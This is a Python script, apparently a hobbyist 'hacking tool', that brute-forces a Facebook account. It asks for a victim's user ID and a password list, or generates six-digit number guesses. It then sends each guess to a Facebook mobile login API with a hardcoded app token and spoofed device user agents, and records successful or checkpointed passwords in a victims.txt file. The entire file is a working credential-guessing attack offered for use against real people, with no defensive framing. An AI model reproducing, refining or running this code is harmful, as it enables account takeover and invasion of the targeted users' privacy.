#----------import-module------------#
import os, sys, time, random, json, requests, mechanize,datetime
from time import sleep
import requests, sys, os, random, time,json
uagent=["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"]
def slow(t):
    for e in t + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.06)
#-------------colors------------#
G = "\033[38;5;46m";G0 = "\x1b[38;5;46m";G1 = "\x1b[38;5;47m";G2 = "\x1b[38;5;48m";G3 = "\x1b[38;5;49m";G4 = "\x1b[38;5;50m";G5 = "\x1b[38;5;51m";G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";R = "\033[1;91m";RE = "\033[1;31m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\033[38;5;53m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m"
W='\033[1;37m';G='\033[1;32m';R='\033[1;31m';B='\033[1;34m';A='\033[1;36m';C='\033[1;35m';Y='\033[1;33m'
#------------line-----------#
def linex():
	print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━") 
#-------------logo--------------#
logo=(f"""

    ____  ___    __ __ ________ 
   / __ \/   |  / //_//  _/ __ )
  / /_/ / /| | / ,<   / // __  |
 / _, _/ ___ |/ /| |_/ // /_/ / 
/_/ |_/_/  |_/_/ |_/___/_____/  
   
KULLU NAFSIN ZAIKATUL MAUT         EVERYONE
MOST ACCEPT THE    TEST OF DEATH 

DEVOLOPER : RAKIB CYBER ARMY
FACEBOOK  : R A K I B
GITHUB    : MRRAKIB-7379
TOOLS     : TARGET ID HACK
VERSION   : 1.0.0                  

{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#-----------clear-def-----------#
def clear():
  os.system("clear")
  print(logo)
#--------------main-menu--------------#
clear()
id=[]
victim = input(f"{R}[{G}={R}]{W} Enter Victim's UID{R}:{G} ")
linex()
passlist= input(f"{R}[{G}={R}]{W} Password List {R}[{G}Press Just Enter For Auto Pass{R}]{R}:{G} ")

if passlist == "" or passlist == " " or passlist=="  ":
  fil=".autopass"
  linex()
  slow(f"{R}[{G}={R}]{G} Please Wait A Moment")
  slow(f"{R}[{G}={R}]{G} Trying To Generate Auto Password List")
  ii = 99999
  f = open(".autopass","w")
  while True:
	  ii += 1
	  f.write(str(ii)+"\n")
	  if ii==1000000:
		  break
  f.close()
  slow(f"{R}[{G}={R}]{G} Auto Password List Generated")
  time.sleep(1)
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow(f"{R}[{G}={R}]{G} File Not Found")
    slow(f"{R}[{G}={R}]{G} Try Again")
    sys.exit()
else:
  fil=passlist
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow(f"{R}[{G}={R}]{G} File Not Found")
    slow(f"{R}[{G}={R}]{G} Try Again")
    sys.exit()
now= datetime.datetime.now()
rtime=now.strftime("%H:%M:%S")
linex()
print(f"{R}[{G}={R}]{W} Victim's UID{R}:{G} "+str(victim))
print(f'{R}[{G}={R}]{W} Total Passwords{R}:{G} '+str(total))
print(f"{R}[{G}={R}]{W} Trying From{R}:{G} "+fil)
print(f"{R}[{G}={R}]{W} Right Password Will Save In victims.txt")
print(f"{R}[{G}={R}]{W} Attacking Time{R}:{G} "+str(rtime))
linex()
slow(f"{R}[{G}={R}]{G}  Attack Starting.....");linex()
time.sleep(2)
def crack_file():
  pasw=open(fil,"r")
  for i in range(int(total)):
    try:
      try:
        pw=pasw.readline()
        pw=pw.replace("\n","")
        nagent = random.choice(uagent)
        ses = requests.Session()
        headers = {
      					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
      					"x-fb-sim-hni": str(random.randint(20000, 40000)), 
      					"x-fb-net-hni": str(random.randint(20000, 40000)), 
      					"x-fb-connection-qunisadty": "EXCELLENT",
      					"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
      					"user-agent": nagent, 
      					"content-type": "application/x-www-form-urlencoded", 
      					"x-fb-http-engine": "Liger"
      				}
        
        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(victim)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
        hnow= datetime.datetime.now()
        htime=hnow.strftime("%H:%M:%S")
        if "session_key" in response.text and "EAAA" in response.text:
      	  linex()
      	  print(f"{R}[{G}={R}]{G} Password Found")
      	  print(f"{R}[{G}={R}]{G} Status: Successful")
      	  print(f"{R}[{G}={R}]{W} Uid{R}:{G} "+victim)
      	  print(f"{R}[{G}={R}]{W} Password{R}:{G} "+pw)
      	  save=open("victims.txt","a")
      	  save.write("Victim Found\nStatus: Successful\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
      	  save.close()
      	  linex()
      	  break
        elif "www.facebook.com" in response.json()["error_msg"]:
      	  linex()
      	  print(f"{R}[{G}={R}]{G} Password Found")
      	  print(f"{R}[{G}={R}]{B} Status: Checkpoint")
      	  print(f"{R}[{G}={R}]{W} Uid{R}:{B} "+victim)
      	  print(f"{R}[{G}={R}]{W} Password{R}:{B} "+pw)
      	  save=open("victims.txt","a")
      	  save.write("Victim Found\nStatus: Checkpoint\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
      	  save.close()
      	  linex()
      	  break
        else:
          print("\033[1;31m [\033[1;32m"+str(i)+"\033[1;31m]\033[1;37m Wrong Password:\033[1;31m "+str(pw)+"\033[1;37m")
          continue
      except requests.exceptions.RequestException:
        print("\n\033[1;37m   Failed\n   Check Your Network\033[1;37m\n")
    except:pass
crack_file()
